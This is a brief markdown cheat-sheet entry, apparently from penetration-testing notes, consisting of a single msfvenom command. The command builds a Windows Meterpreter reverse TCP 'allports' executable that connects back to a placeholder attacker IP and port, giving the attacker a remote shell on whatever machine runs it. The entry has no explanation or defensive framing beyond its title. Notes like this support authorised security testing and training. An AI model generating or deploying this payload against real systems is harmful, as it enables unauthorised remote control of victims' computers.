# 🔺 MSFVenom

## MSFVenom Commands

```
# Payload for all ports
msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=<attacker ip> LPORT=<attacker port> -a x86 -f exe > allports.exe
```
